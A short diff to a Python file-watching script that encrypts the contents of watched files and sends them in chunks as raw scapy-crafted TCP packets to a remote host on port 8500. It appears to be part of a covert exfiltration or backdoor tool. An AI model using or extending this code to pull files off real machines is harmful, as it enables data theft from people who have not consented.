@@ -38,12 +38,13 @@ class EventHandler(pyinotify.ProcessEvent):
 
         # Encrypt data first, and then send
         encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
-        encrypted_data = encrypted_data + b"$EOF" + bytes(filename, encoding="utf-8")
+        chunks = [encrypted_data[i:i+1000] for i in range(0, len(encrypted_data), 1000)]
+        chunks[-1] += b"$EOF" + bytes(filename, encoding="utf-8")
 
-        pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/encrypted_data
-
-        send(pkt, verbose=False)
-        time.sleep(0.1)
+        for chunk in chunks:
+            pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/chunk
+            send(pkt, verbose=False)
+            time.sleep(1)
 
 
 def start_watchfile(filename, host_ip):
